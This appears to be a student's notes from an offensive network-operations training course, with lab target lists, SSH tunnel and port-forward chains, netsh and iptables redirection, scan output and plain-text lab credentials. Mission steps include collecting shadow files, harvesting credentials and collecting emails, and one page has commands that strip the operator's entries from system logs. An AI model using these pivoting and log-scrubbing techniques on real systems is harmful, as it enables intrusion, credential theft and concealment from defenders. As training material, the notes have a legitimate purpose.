StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10300:192.168.0.23:22 -L10400:192.168.0.23:10400 -L10500:192.168.0.23:10500 -L10600:192.168.0.23:10600<br />ssh -S /tmp/t2 dum@127.0.0.1<br /><br /><br />To T3: (forward to T4)<br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t3 dum@127.0.0.1<br />sudo iptables -t nat -A PREROUTING -p tcp --dport 10400 -j DNAT --to-destination 192.168.0.12:22<br />sudo iptables -t nat -A PREROUTING -p tcp --dport 10500 -j DNAT --to-destination 192.168.0.12:10500<br />sudo iptables -t nat -A PREROUTING -p tcp --dport 10600 -j DNAT --to-destination 192.168.0.12:10600<br />sudo iptables -t nat -A PREROUTING -p tcp --dport 10600 -j DNAT --to-destination 192.168.0.12:10700<br /><br />sudo iptables -t nat -A POSTROUTING -s 192.168.0.10 -p tcp -j SNAT --to-source 192.168.0.23<br /><br /><br />To T4: (forward to T5)<br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t4 dum@127.0.0.1<br />netsh interface portproxy set v4tov4 listenport=10500 listenaddress=192.168.0.12 connectaddress=192.168.0.9 connectport=22 protocol=tcp<br />netsh interface portproxy set v4tov4 listenport=10600 listenaddress=192.168.0.12 connectaddress=192.168.0.9 connectport=10600 protocol=tcp<br />netsh interface portproxy set v4tov4 listenport=10700 listenaddress=192.168.0.12 connectaddress=192.168.0.9 connectport=10700 protocol=tcp<br /><br />To T5: (forward to T6)<br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t5 dum@127.0.0.1<br />netsh interface portproxy set v4tov4 listenport=10600 listenaddress=192.168.0.9 connectaddress=192.168.0.13 connectport=22 protocol=tcp<br />netsh interface portproxy set v4tov4 listenport=10700 listenaddress=192.168.0.9 connectaddress=192.168.0.13 connectport=10700 protocol=tcp<br /><br />To T6: (forward to T7)<br />ssh -M -S /tmp/t6 -p 10600 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -<strong>L10700</strong>:192.168.0.27:22<br />ssh -S /tmp/t6 dum@127.0.0.1<br /><br />To T7:<br />ssh -M -S /tmp/t7 -p 10700 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t7 dum@127.0.0.1<br /><br /><br /><br /><strong>password14</strong><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>StressRelief1</h1><br/><br />&gt;T1: 10.50.24.79 BruceWayne Linux                           ssh in. Scan Network, Report Results, Collect /etc/passwd, /etc/shadow. Redir to T2 via ssh.<br />    -&gt; T2: 10.153.10.202 ArthurCurry Windows              ssh in. SURVEY. Redir toT3 and T4 via ssh.<br />        --&gt; T3: 10.153.10.12 JonnJonzz Linux                   ssh in. Survey. BURNOFF<br />        --&gt; T4: 10.153.10.14  ClarkKent Linux                 ssh in. Survey. Redir to T5 and T7<br />            ---&gt; T5: 10.153.10.83 HalJordan Windows        ssh in. Srutvey. Redir to T6<br />                ----&gt; T6: 10.153.10.127 BarryAllen Linux      ssh in Survey. BURNOFF<br />            ---&gt;T7: 10.153.10.33 Diana Linux                    ssh in Survey. Conclude mission.<br /><br /><br /><br /><br /><br />To T1: (forward to T2)<br />ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.24.79 -L10200:10.153.10.202:22<br /><br /><br />To T2: (forward to T3)<br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10300:10.153.10.12:22 -L10400:10.153.10.14:22<br /><br /><br />To T3: (forward to T4)<br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br /><br /><br />To T4: (forward to T5)<br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10500:10.153.10.83:22 -L10700:10.153.10.33:22<br /><br /><br />To T5: (forward to T6)<br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10600:10.153.10.127:22<br /><br /><br />To T6: (forward to T7)<br />ssh -M -S /tmp/t6 -p 10600 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br /><br />To T7:<br />ssh -M -S /tmp/t7 -p 10700 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br /><br /><br /><br /><strong>password14</strong><br /></div><div class='page'><h1 class='title level-4'>DR01</h1><br/>&gt;T1: 10.50.26.252   &amp; 10.145.117.86        linux                               SSH in (22011). Vet, Scan Network for ssh ports (22000-22999). (41481 for T3). <br />    -&gt;T2: 10.145.117.11            linux                      SSH in. Vet.  <br />        --&gt;T3: 10.145.117.15 &amp; 192.168.117.98   network device       SSH in. Vet. Scan 192.168.117.0/24 22000-22999. <br />            ---&gt;T4: 192.168.117.100          Linux                  SSH in. Vet. Survey. Eval?<br />                ----&gt;T5: 192.168.117.101             Windows          SSH in. Vet. Survey. Eval?<br />                    -----&gt;T6: 192.168.117.102        Linux          SSH in. Vet. Survey Eval?<br />                        ------&gt;T7: 192.168.117.103          Windows         SSH in. Vet. Survey. Eval? Conclude Operation.<br /><br /><br /><br /><br />ssh -M -S /tmp/t1 -p 22011 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.26.252<br />ssh -S /tmp/t1 dummy@127.0.0.1 -O forward -D127.0.0.1:9050<br />ssh -S /tmp/t1 dummy@127.0.0.1 -O cancel -D127.0.0.1:9050<br />ssh -S /tmp/t1 dummy@127.0.0.1 -O forward -L10200:10.145.117.11:22012<br /><br /><br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t2 dummy@127.0.0.1 -O forward -L10300:10.145.117.15:22012<br /><br /><br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t3 dummy@127.0.0.1 -O forward -D127.0.0.1:9050<br />ssh -S /tmp/t3 dummy@127.0.0.1 -O cancel -D127.0.0.1:9050<br />ssh -S /tmp/t3 dummy@127.0.0.1 -O forward -L10400:192.168.117.100:22013<br /><br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10500:192.168.117.101:22013<br /><br /><br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10600:192.168.117.102:22013<br /><br /><br /><br />ssh -M -S /tmp/t6 -p 10600 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10700:192.168.117.103:22013<br /><br /><br /><br />ssh -M -S /tmp/t7 -p 10700 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br /><br /><br /><br /><br /><br /><br /><br /><br /><strong>password14</strong><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />Nmap scan report for 10.145.117.15                                                                                                                      <br />Host is up (0.0021s latency).                                                                                                                           <br />Not shown: 100 closed ports                                                                                                                             <br />PORT      STATE SERVICE                                                                                                                                 <br />22012/tcp open  unknown                                                                                                                                 <br />                                                                                                                                                        <br />Nmap scan report for 10.145.117.16                                                                                                                      <br />Host is up (0.0048s latency).                                                                                                                           <br />Not shown: 100 closed ports                                                                                                                             <br />PORT      STATE SERVICE                                                                                                                                 <br />22012/tcp open  unknown     <br /><br /><br /><br /><br />22013 open on 192.168.117.100-104<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />Nmap scan report for 192.168.117.100                                                                                                                    <br />Host is up (0.0025s latency).                                                                                                                           <br />                                                                                                                                                        <br />PORT      STATE SERVICE VERSION                                                                                                                         <br />22013/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)                                                                                                      <br />                                                                                                                                                        <br />Nmap scan report for 192.168.117.101                                                                                                                    <br />Host is up (0.0056s latency).                                                                                                                           <br /><br />PORT      STATE SERVICE VERSION<br />22013/tcp open  ssh     OpenSSH for_Windows_7.7 (protocol 2.0)<br /><br />Nmap scan report for 192.168.117.102<br />Host is up (0.0026s latency).<br /><br />PORT      STATE SERVICE VERSION<br />22013/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)<br /><br />Nmap scan report for 192.168.117.103<br />Host is up (0.0029s latency).<br /><br />PORT      STATE SERVICE VERSION<br />22013/tcp open  ssh     OpenSSH for_Windows_7.7 (protocol 2.0)<br /><br />Nmap scan report for 192.168.117.104<br />Host is up (0.0031s latency).<br /><br />PORT      STATE SERVICE VERSION<br />22013/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /></div><div class='page'><h1 class='title level-4'>DR02</h1><br/>&gt; T1: 10.50.26.252/10.145.117.86  EXT_RTR   Linux   SSH In. Vet. Redir T2.<br />    -&gt; T2: 10.145.117.11    Storage1    Linux   SSH in. Vet. Redir T3.<br />        --&gt; T3: 10.145.117.15   Unknown     Unknown     SSH in. Vet. Redir to T4.<br />            ---&gt; T4: 192.168.117.104    Target4     Linux       SSH in. Vet. Survey.  Followon Value to analyst. Collect Files. Scan. Redir to T5, T6, and T7.<br />                ----&gt; T5: 192.168.117.105   TARGET5     Windows     Creds Unknown. SSH in. Vet. Survey. Followon Value. Collect Files. BurnOFF.<br />                ----&gt; T6: 192.168.117.106   USER6       Linux           Creds Unknown. SSH in. Vet. Survey. Followon Value. Collect Files. BurnOFF.<br />                ----&gt; T7: 192.168.117.107   USER7       Windows     Creds Unknown. SSH in. Vet. Survey. Followon Value. Collect Files. BurnOFF. Conclude Opp.<br /><br /><br /><br /><br /><br /><br />ssh -M -S /tmp/t1 -p 22011 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.26.252 -L10200:10.145.117.11:22012<br /><br /><br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10300:10.145.117.15:22012<br /><br /><br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10400:192.168.117.104:22013<br /><br /><br /><br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 <br />ssh -S /tmp/t4 dummy@127.0.0.1 -O forward -D127.0.0.1:9050<br />ssh -S /tmp/t4 dummy@127.0.0.1 -O cancel -D127.0.0.1:9050<br /><br />ssh -o ControlPath=/tmp/t4 a -O forward -L10500:192.168.117.105:22013<br />ssh -o ControlPath=/tmp/t4 a -O forward -L10600:192.168.117.106:22013<br />ssh -o ControlPath=/tmp/t4 a -O forward -L10700:192.168.117.107:22013<br /><br /><br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 <br /><br /><br /><br />ssh -M -S /tmp/t6 -p 10600 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 <br /><br /><br /><br />ssh -M -S /tmp/t7 -p 10700 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 <br /><br /><br /><br /><br /><br /><br />password14<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />Are the followin IP&#39;s cleared hot?<br />10.50.26.252/10.145.117.86<br />10.145.117.11<br />10.145.117.15<br />192.168.117.104<br />192.168.117.105<br />192.168.117.106<br />192.168.117.107<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>DR03</h1><br/><small>&gt; T1: </small>10.50.26.252      Linux       EXT_RTR         SSH in. Vet. Redir to T2.<br />    <small>-&gt; T2: </small>10.145.117.10    Windows     SERVER0         SSH in. Vet. Find hmailserver creds. Redir to T3<br />        <small>--&gt; T3: </small>10.145.117.16       Unknown     Unk         SSH in. Vet. Redir To T4 and T5.<br />            <small>---&gt; T4: </small>192.169.117.200    Unk         UNK         SSH in. Vet. Survey. Harves Creds. collect files.  BURN OFF.<br />            <small>---&gt; T5: </small>192.169.117.201     Linux      TargetA     SSH in. Survey. Redir to T6.<br />                ----&gt; T6: 129.168.117.54    Windows     TargetA_Admin       SSH in. Survey. Conclude Op.<br /><br /><br /><br /><br /><br />ssh -M -S /tmp/t1 -p 22011 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.26.252 -L10200:10.145.117.10:22012<br /><br /><br /><br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10300:10.145.117.16:22013<br />ssh -S /tmp/t2 a -O cancel -L10300:10.145.117.16:22013<br />ssh -S /tmp/t2 a -O forward -L10300:10.145.117.16:22012<br /><br /><br /><br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10400:192.169.117.200:22013 -L10500:192.169.117.201:22013<br /><br /><br /><br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br /><br /><br /><br /><br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10600:129.168.117.54:22013<br /><br /><br /><br /><br />ssh -M -S /tmp/t6 -p 10600 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br /><br /><br /><br /><br /><br /><br /><br /><br />***** MC DEBRIEF *****<br />Operator: Student14<br />Operation: Dry Run 03<br />MC: MC2<br />Analyst: Analyst2                                                                                                                     <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />T1:  Submitted selinux, rsyslog,   Redirected T2<br />T2:  Submitted LogFusion, priv user. Aquired Creds. Redir to T3.<br />T3:  Submitted selinux, centos.rtr.updtr, Redir To T4 and T5.<br />T4:  Submitted process accounting, selinux. Survey, Collected files. Burned off.<br />T5:  Submitted file2.txt, file3.txt, maytheforcebewithyou.txt, rsyslog, tcpdump, priv User. Did Survey.Redir to T6.<br />T6:  Submitted selinux, maldet, priv user.  Did survey. Completed Misson.  <br />***** END OF REPORT <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />password14</div><div class='page'><h1 class='title level-4'>DR04</h1><br/>&gt; 10.50.26.252, 10.145.117.86   Linux   EXT_RTR         SSH in. Vet. Redir To T2<br />    -&gt; T2: 10.145.117.10    Windows     SERVER0         SSH in. Vet. NETSH to T3        NETSHHHHHHHHHHHHHHHHHHH<br />        --&gt; T3: 10.145.117.16, 192.169.117.198   Linux  int_rtr2     SSH in. Vet. Redir to T4.<br />            ---&gt; T4: 192.169.117.200        Linux   Admin2      SSH in. Vet. Survey. Record changes since last op. Collect New Files of interest. Redir To T5, T7.<br />                ----&gt; T5: 192.169.117.201    Linux   TargetA     SSH in. Vet. Survey. Record changes since last op. Find all .txt files. Collect files of interest. Redir to T6 via IPTables. <br />                    -----&gt; T6: 192.169.117.202  Linux   TargetB     SSH in. Vet. Survey.  Collect all image files in root’s home directory recursively. BURN OFF. Undo IPtables on T5.<br />                ----&gt; T7: 192.169.117.203       Windows     TargetC     SSH in. Vet. Survey. Collect FOI. Conclude Op.<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />ssh -M -S /tmp/t1 -p 22011 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.26.252 -L10200:10.145.117.10:22012 -L10300:10.145.117.10:31014<br /><br /><br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />netsh interface portproxy show all<br />netsh interface portproxy set v4tov4 listenport=31014 listenaddress=10.145.117.10 connectaddress=10.145.117.16 connectport=22012 protocol=tcp<br />netsh interface portproxy delete v4tov4 listenport=31014 listenaddress=10.145.117.10 protocol=TCP<br /><br /><br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10400:192.169.117.200:22013<br /><br /><br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10500:192.169.117.201:22013 -L10600:192.169.117.201:22814 -L10700:192.169.117.203:22013<br /><br /><br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 <br />lsmod | grep ip_tables<br />lsmod | grep x_tables<br />sudo iptables -t nat -L<br />sysctl net.ipv4.ip_forward      &lt; check if iprouting is enabled<br />sysctl -w net.ipv4.ip_forward=1     &lt; enable iprouting<br />sudo iptables -t nat -A PREROUTING -p tcp --dport 22814 -j DNAT --to-destination 192.169.117.202:22013<br />sudo iptables -t nat -A POSTROUTING -s 192.169.117.200 -p tcp -j SNAT --to-source 192.169.117.201<br />sudo iptables -L -t nat --line-number<br />sudo iptables -t nat -D POSTROUTING 1<br />sudo iptables -t nat -D PREROUTING 1<br /><br /><br />ssh -M -S /tmp/t6 -p 10600 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 <br /><br /><br />ssh -M -S /tmp/t7 -p 10700 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 <br /><br /><br />password14<br /><br /><br /><br />ssh -S /tmp/t2 a -O cancel -L10300:10.145.117.16:22013<br />ssh -S /tmp/t2 a -O forward -L10300:10.145.117.16:22012</div><div class='page'><h1 class='title level-4'>DR05</h1><br/>&gt;T1: 10.50.26.252       Linux       EXT_RTR     SSH in. Vet. Redir T2.     <br />    -&gt;T2: 10.145.117.11     Linux   SERVER1     SSH in. Vet. Redir to T3 &amp; T5.<br />        --&gt;T3: 10.145.117.15    Linux   int_rtr1        SSH in. Vet. Redir to T4.   <br />            ---&gt;T4: 192.168.117.100     Linux ADMIN1        SSH in. Vet. Survey. Record Changes Since last access. BURNOFF. BURNOFF T3.<br />        --&gt;T5: 10.145.117.16        Linux   int_rtr2            SSH in. Vet. REDIR to T6,7,8,9,10<br />            ---&gt;T6: 192.169.117.200     Linux   ADMIN2     SSH in. Vet. Survey. Record Changes Since last access. BURNOFF.<br />            ---&gt;T7: 192.169.117.204     UNK     TargetD     SSH in. Vet. Survey. Find the .txt files. Collect FOI. BURNOFF.<br />            ---&gt;T8: 192.169.117.205     UNK     TARGETE     SSH in. Vet. Survey. BURNOFF.<br />            ---&gt;T9: 192.169.117.206     UNK     TARGETF     SSH in. Vet. Survey. BURNOFF.<br />            ---&gt;T10: 192.169.117.207    UNK     TARGETG     SSH in. Vet. Survey. BURNOFF. Conclude Op.<br /><br /><br /><br /><br /><br /><br /><br /><br />ssh -M -S /tmp/t1 -p 22011 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.26.252 -L10200:10.145.117.11:22012<br /><br /><br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10300:10.145.117.15:22012 -L10500:10.145.117.16:22012<br /><br /><br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10400:192.168.117.100:22013<br /><br /><br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 <br /><br /><br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10600:192.169.117.200:22013 -L10700:192.169.117.204:22013 -L10800:192.169.117.205:22013 -L10900:192.169.117.206:22013 -L11000:192.169.117.207:22013<br /><br /><br />ssh -M -S /tmp/t6 -p 10600 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1  <br /><br /><br />ssh -M -S /tmp/t7 -p 10700 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 <br /><br /><br />ssh -M -S /tmp/t8 -p 10800 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 <br /><br /><br />ssh -M -S /tmp/t9 -p 10900 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 <br /><br /><br />ssh -M -S /tmp/t10 -p 11000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 <br /><br /><br /><br /><br />password14<br /><br /><br /><br />sudo cat /var/log/secure | grep -v student14  &gt; /tmp/secure.clean.14<br />md5sum /tmp/secure.clean.14<br />ssh -S /tmp/t1 a &quot;sudo -S cat /tmp/secure.clean.14&quot; &gt; secure.clean.14<br />sudo cp /tmp/secure.clean.14 /var/log/secure<br /><br />sudo cat /var/log/messages | grep -v student14 &gt; /tmp/messages.clean.14<br />md5sum /tmp/messages.clean.14<br />ssh -S /tmp/t1 a &quot;sudo -S cat /tmp/messages.clean.14&quot; &gt; messages.clean.14<br />sudo cp /tmp/messages.clean.14 /var/log/messages</div><div class='page'><h1 class='title level-4'>Eval01</h1><br/>&gt;T1: 10.50.20.193, 10.20.169.33   EXT_RTR     Linux       SSH in. Vet. Redir To T2.<br />    -&gt;T2: 10.20.169.121     WEBSERVER       Linux       SSH in. Vet. Scan. Redir T3.                &lt;&lt;Skipped<br />        --&gt;T3: 10.20.169.238                                  SSH in. Vet. Scan. Conclude Operation.<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />ssh -M -S /tmp/t1 -p 10123 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer14@10.50.20.193 -L10200:10.20.169.121:52203<br />engineer14      enshallah<br />ssh -S /tmp/t1 dummy@127.0.0.1 -O forward -D127.0.0.1:9050<br />ssh -S /tmp/t1 dummy@127.0.0.1 -O cancel -D127.0.0.1:9050<br />ssh -S /tmp/t1 dummy@127.0.0.1 -O forward -L10300:10.20.269.238:52230<br /><br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson14@127.0.0.1 -D127.0.0.1:9050<br />caisson14   tread_depth<br />ssh -S /tmp/t2 dummy@127.0.0.1 -O cancel -D127.0.0.1:9050<br />ssh -S /tmp/t2 dummy@127.0.0.1 -O forward -L10300::52230<br /><br /><br />ssh -M -S /tmp/t3 -p  10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin14@127.0.0.1 <br />NOC_Admin#::5gftE8DCc8<br />ssh -S /tmp/t3 dummy@127.0.0.1 -O forward -D127.0.0.1:9050<br />ssh -S /tmp/t3 dummy@127.0.0.1 -O cancel -D127.0.0.1:9050</div><div class='page'><h1 class='title level-4'>Eval02</h1><br/>&gt;T1: 10.50.31.111       EXT_RTR     Linux       SSH in. Vet. Redir T2.<br />    -&gt;T2: 10.20.169.122     STORAGE1    Windows     SSH in. Vet. Redir T3.<br />        --&gt;T3: 10.20.169.238    Vyos1   Linux       SSH in. Vet. Redir T4.          <br />            ---&gt;T4: 192.168.169.43   ADMIN1     Linux   SSH in. Vet. Survey. CollectFOI. Scan for mail servers. Redir T5,6.  <br />                ----&gt;T5: Suspected mail server?     Unk     Unk     SSh in. Vet. Survey. Collect Emails. BURNOFF. &quot;?If applicable?&quot;<br />                ----&gt;T6: Suspected mail server?     Unk     Unk     SSh in. Vet. Survey. Collect Emails. Conclude Op.<br /><br /><br /><br /><br /><br /><br />ssh -M -S /tmp/t1 -p 10123 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer14@10.50.31.111 -L10200:10.20.169.122:52203<br /><strong>engineer14::enshallah</strong><br /><br /><br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson14@127.0.0.1 -L10300:10.20.169.238:52230<br /><strong>caisson14::tread_depth</strong><br /><br /><br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin14@127.0.0.1 -L10400:192.168.169.43:33125<br /><strong>NOC_Admin14::5gftE8DCc8</strong><br /><br /><br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user14@127.0.0.1 -D127.0.0.1:9050<br /><strong>user14::P455w0rd </strong><br />ssh -S /tmp/t4 dummy@127.0.0.1 -O cancel -D127.0.0.1:9050<br />ssh -S /tmp/t4 dummy@127.0.0.1 -O forward -L10500:10.123.169.30:33502<br />ssh -S /tmp/t4 dummy@127.0.0.1 -O forward -L10600:10.123.169.35:33502<br /><br /><br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user14@127.0.0.1<br />user14::P455w0rd<br /><br />ssh -M -S /tmp/t6 -p 10600 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user14@127.0.0.1<br />user14::P455w0rd<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><strong>engineer14::enshallah<br />caisson14::tread_depth<br />NOC_Admin14::5gftE8DCc8<br />user14::P455w0rd</strong></div><div class='page'><h1 class='title level-5'>T4 Scanning</h1><br/>10.123.169.35:33502<br />10.123.169.30:33502<br />.5<br /><br />33500-33600<br /><br /><br /><br />arp -a <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />10.123.169.7 dev eth0 lladdr fa:16:3e:dd:db:ca STALE<br />192.168.169.1 dev eth1 lladdr fa:16:3e:96:0b:56 DELAY<br />10.123.169.3 dev eth0 lladdr fa:16:3e:77:f0:72 STALE<br />10.123.169.6 dev eth0 lladdr fa:16:3e:7a:fd:5c STALE<br />192.168.169.206 dev eth1 lladdr fa:16:3e:44:39:40 REACHABLE<br />10.123.169.2 dev eth0 lladdr fa:16:3e:20:e3:da STALE<br />192.168.169.4 dev eth1 lladdr fa:16:3e:c0:b1:3f STALE<br />192.168.169.3 dev eth1 lladdr fa:16:3e:33:99:04 STALE<br />192.168.169.7 dev eth1 lladdr fa:16:3e:2d:d6:48 STALE<br />10.123.169.1 dev eth0 lladdr fa:16:3e:4d:cb:dd STALE<br />192.168.169.2 dev eth1 lladdr fa:16:3e:d3:45:41 STALE<br />10.123.169.4 dev eth0 lladdr fa:16:3e:67:8d:db STALE<br />192.168.169.6 dev eth1 lladdr fa:16:3e:b0:8d:89 STALE<br /><br /><br />? (10.123.169.3) at fa:16:3e:77:f0:72 [ether] on eth0<br />? (10.123.169.6) at fa:16:3e:7a:fd:5c [ether] on eth0<br />? (192.168.169.206) at fa:16:3e:44:39:40 [ether] on eth1<br />? (10.123.169.2) at fa:16:3e:20:e3:da [ether] on eth0<br />? (192.168.169.4) at fa:16:3e:c0:b1:3f [ether] on eth1<br />? (192.168.169.3) at fa:16:3e:33:99:04 [ether] on eth1<br />? (192.168.169.7) at fa:16:3e:2d:d6:48 [ether] on eth1<br />? (10.123.169.1) at fa:16:3e:4d:cb:dd [ether] on eth0<br />? (192.168.169.2) at fa:16:3e:d3:45:41 [ether] on eth1<br />? (10.123.169.4) at fa:16:3e:67:8d:db [ether] on eth0<br />? (192.168.169.6) at fa:16:3e:b0:8d:89 [ether] on eth1<br /><br /><br /><br /><br /><br />10.123.169.7<br />192.168.169.1<br />10.123.169.3<br />10.123.169.6<br />192.168.169.206<br />10.123.169.2<br />192.168.169.4<br />192.168.169.3<br />192.168.169.7<br />10.123.169.1<br />192.168.169.2<br />10.123.169.4<br />192.168.169.6<br /><br />10.123.169.3<br />10.123.169.6<br />192.168.169.206<br />10.123.169.2<br />192.168.169.4<br />192.168.169.3<br />192.168.169.7<br />10.123.169.1<br />192.168.169.2<br />10.123.169.4<br />192.168.169.6<br /><br /><br /><br /><br />10.123.169.1<br />10.123.169.2<br />10.123.169.3<br />10.123.169.4<br />10.123.169.6<br />10.123.169.7<br /></div><div class='page'><h1 class='title level-5'>T6</h1><br/>drwxrwxr-x. 9 root    mail 4.0K May 11 16:45 .<br />drwxr-xr-x. 7 root    root   71 Aug  8  2019 ..<br />-rw-r--r--. 1 root    root 2.6K May 10 18:09 Air<br />drwxr-xr-x. 2 root    root 4.0K May 10 18:09 Air Defense<br />drwxr-xr-x. 2 root    root 4.0K May 10 18:09 Armored Cavalry<br />-rw-rw----. 1 centos  mail    0 May 10 18:07 centos<br />drwxr-xr-x. 2 root    root 4.0K May 10 18:09 Command Elements<br />drwxr-xr-x. 2 root    root 4.0K May 10 18:09 Cyber-Comms Detachment<br />drwxr-xr-x. 2 root    root 4.0K May 11 11:44 Ground Forces<br />-rw-rw----. 1 radicle mail    0 May 10 18:07 radicle<br />drwxr-xr-x. 2 root    root 4.0K May 10 18:09 